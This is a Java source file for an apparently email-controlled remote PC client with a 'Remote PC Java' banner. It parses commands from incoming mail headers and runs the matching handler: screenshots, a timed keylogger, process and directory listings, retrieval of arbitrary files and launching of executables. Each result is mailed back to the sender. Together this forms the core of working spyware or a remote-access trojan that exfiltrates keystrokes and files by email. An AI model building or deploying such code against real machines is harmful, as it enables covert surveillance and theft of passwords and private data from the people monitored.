package com.util;

import javax.mail.MessagingException;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.ZonedDateTime;
import java.time.format.DateTimeFormatter;
import java.util.Arrays;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class MainClient {
    public static final String BANNER = """
             ________  _______   _____ ______   ________  _________  _______        \s
            |\\   __  \\|\\  ___ \\ |\\   _ \\  _   \\|\\   __  \\|\\___   ___\\\\  ___ \\       \s
            \\ \\  \\|\\  \\ \\   __/|\\ \\  \\\\\\__\\ \\  \\ \\  \\|\\  \\|___ \\  \\_\\ \\   __/|      \s
             \\ \\   _  _\\ \\  \\_|/_\\ \\  \\\\|__| \\  \\ \\  \\\\\\  \\   \\ \\  \\ \\ \\  \\_|/__    \s
              \\ \\  \\\\  \\\\ \\  \\_|\\ \\ \\  \\    \\ \\  \\ \\  \\\\\\  \\   \\ \\  \\ \\ \\  \\_|\\ \\   \s
               \\ \\__\\\\ _\\\\ \\_______\\ \\__\\    \\ \\__\\ \\_______\\   \\ \\__\\ \\ \\_______\\  \s
                \\|__|\\|__|\\|_______|\\|__|     \\|__|\\|_______|    \\|__|  \\|_______|  \s
                                                                                    \s
                                                                                    \s
                                                                                    \s
             ________  ________             ___  ________  ___      ___ ________    \s
            |\\   __  \\|\\   ____\\           |\\  \\|\\   __  \\|\\  \\    /  /|\\   __  \\   \s
            \\ \\  \\|\\  \\ \\  \\___|           \\ \\  \\ \\  \\|\\  \\ \\  \\  /  / | \\  \\|\\  \\  \s
             \\ \\   ____\\ \\  \\            __ \\ \\  \\ \\   __  \\ \\  \\/  / / \\ \\   __  \\ \s
              \\ \\  \\___|\\ \\  \\____      |\\  \\\\_\\  \\ \\  \\ \\  \\ \\    / /   \\ \\  \\ \\  \\\s
               \\ \\__\\    \\ \\_______\\    \\ \\________\\ \\__\\ \\__\\ \\__/ /     \\ \\__\\ \\__\\
                \\|__|     \\|_______|     \\|________|\\|__|\\|__|\\|__|/       \\|__|\\|__|
            """;

    private static boolean takeShot(int id, String sender) {
        String subject = "res/" + id;
        try {
            SendMail.getInstance().sendMail(subject, null, Screenshot.getInstance().takeScreenShot()
                    , true, sender);
            return true;
        } catch (IOException | MessagingException e) {
            e.printStackTrace();
            return false;
        }
    }


    private static boolean keyLog(int id, long time, String sender) {
        String filename = "KEY LOG" + ZonedDateTime.now().format(DateTimeFormatter
                .ofPattern(" dd-MM-yyyy HH-mm")) + ".txt";
        try {
            KeyLogger.getInstance().startLog(filename, time);
            String subject = "res / " + id;
            SendMail.getInstance().sendMail(subject, null, filename, true, sender);
            return true;
        } catch (IOException e) {
            System.out.println("Error log");
            e.printStackTrace();
            return false;
        } catch (MessagingException e) {
            System.out.println("Cannot send mail");
            e.printStackTrace();
            return false;
        }
    }

    private static boolean Shutdown(int id, String sudopass, String sender) {
        try {

            int exitcode = ShutandLog.getInstance().Logout(sudopass);
            if (exitcode != 0) {
                String subject = "res / " + id;
                try {
                    SendMail.getInstance().sendMail(subject, "Can't Shutdown, Exit code: " + exitcode
                            , null, true, sender);
                } catch (IOException | MessagingException er) {
                    er.printStackTrace();
                }
                return false;
            }
            return true;
        } catch (Exception e) {
            String subject = "res / " + id;
            try {
                SendMail.getInstance().sendMail(subject, "Can't Shutdown due to error: " + e.toString()
                        , null, true, sender);
            } catch (IOException | MessagingException er) {
                er.printStackTrace();
            }
            e.printStackTrace();
            return false;
        }
    }

    private static boolean ListProcess(int id, String sender) {
        String subject = "res/" + id;
        try {
            SendMail.getInstance().sendMail(subject, null, ProcessPC.getInstance().ProcessList(), true
                    , sender);
            return true;
        } catch (IOException | MessagingException e) {
            e.printStackTrace();
            return false;
        }
    }

    private static boolean listDir(int id, String sender) {
        try {
            ListDir list = new ListDir("");
            String filename = "LIST DIR" + ZonedDateTime.now().format(DateTimeFormatter
                    .ofPattern(" dd-MM-yyyy HH-mm")) + ".txt";
            list.listAll(filename);
            SendMail.getInstance().sendMail("res/" + id, null, filename, true, sender);
            return true;
        } catch (IOException | MessagingException e) {
            System.out.println("error when list");
            e.printStackTrace();
            return false;
        }
    }

    public static boolean getFile(int id, String header, String sender) {
        try {
            Pattern pattern = Pattern.compile("\"(.*)\"");
            Matcher matcher = pattern.matcher(header);
            String filename = "bomaylaymay.txt";
            if (matcher.find()) {
                filename = matcher.group(1);
                System.out.println(filename);
            }
            Path file = Path.of(filename);
            if (Files.exists(file)) {
                if (Files.isRegularFile(file))
                    SendMail.getInstance().sendMail("res/" + id, null, filename, false, sender);
                else {
                    SendMail.getInstance().sendMail("res/" + id + "/0000/You are request for a directory type"
                            , "directory request", null, false, sender);
                }
            } else {
                SendMail.getInstance().sendMail("res/" + id + "/0000/File doesnt exists, try list Dir!"
                        , "File dont exist", null, false, sender);
            }
            return true;
        } catch (IOException | MessagingException e) {
            System.out.println("can not get file");
            e.printStackTrace();
            return false;
        }
    }

    public static boolean runexefile(int id, String path, String sender) {
        String subject = "res/" + id;
        try {
            Path file = Path.of(path);
            if (Files.exists(file)) {
                if (Files.isRegularFile(file)) {
                    SendMail.getInstance().sendMail(subject, Boolean.toString(ProcessPC.getInstance().StartProcess(path))
                            , null, true, sender);
                } else if (path.endsWith(".app")) {
                    SendMail.getInstance().sendMail(subject, Boolean.toString(ProcessPC.getInstance().StartProcess(path))
                            , null, true, sender);
                } else {
                    SendMail.getInstance().sendMail("res/" + id + "/0000/You are request for a directory type"
                            , "directory request", null, true, sender);
                }
            } else {
                SendMail.getInstance().sendMail("res/" + id + "/0000/File doesnt exists, try list Dir!"
                        , "File dont exist", null, true, sender);
            }
            return true;
        } catch (IOException | MessagingException e) {
            System.out.println("can not run file");
            e.printStackTrace();
            return false;
        }
    }

    public static boolean processRequest(String header, String sender) {
        try {
            String[] parts = header.split("/");
            System.out.println(Arrays.toString(parts));
            int id = 0;
            id = Integer.parseInt(parts[1].trim());
            String command = parts[2].trim();
            if (command.equalsIgnoreCase("takeshot")) {
                return takeShot(id, sender);
            } else if (command.equalsIgnoreCase("keylog")) {
                return keyLog(id, Long.parseLong(parts[3].trim()), sender);
            }
//        else if (command.equalsIgnoreCase("Shutdown")) {
//            if (parts.length > 3)
//                return Shutdown(id, parts[3].trim(), sender);
//            return Shutdown(id, "", sender);}
            else if (command.equalsIgnoreCase("ListProcess")) {
                return ListProcess(id, sender);
            } else if (command.equalsIgnoreCase("listdir")) {
                return listDir(id, sender);
            } else if (command.equalsIgnoreCase("get")) {
                return getFile(id, header, sender);
            } else if (command.equalsIgnoreCase("runexe")) {
                String filepath = header.substring(19 + 1).trim();
                return runexefile(id, filepath, sender);
            }
            throw new ArrayIndexOutOfBoundsException();
        } catch (ArrayIndexOutOfBoundsException | NumberFormatException e) {
            try {
                SendMail.getInstance().sendMail("Invalid Syntax request", ""
                        , null, true, sender);
                return true;
            } catch (IOException | MessagingException ex) {
                ex.printStackTrace();
                return false;
            }
        }

    }


    public static void main(String[] args) {

    }
}
